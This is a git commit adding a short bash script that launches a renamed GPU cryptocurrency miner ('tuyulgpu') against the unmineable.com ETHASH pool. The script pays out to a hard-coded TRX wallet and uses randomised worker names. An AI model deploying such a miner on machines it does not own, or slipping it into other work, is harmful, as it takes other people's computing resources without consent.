47bc2d3a380075926ec911fbcbfe1eb50734bb54
sHolazola121 <86874245+sHolazola121@users.noreply.github.com>
2021-07-03 09:42:54 +0000

    Add files via upload

---
+++ bhindi.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=TRX:TFQCDdbTa4C2YUi9aourz4ekKKnPnaxEfF
+WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#at9p-rbx8)
+chmod +x tuyulgpu
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
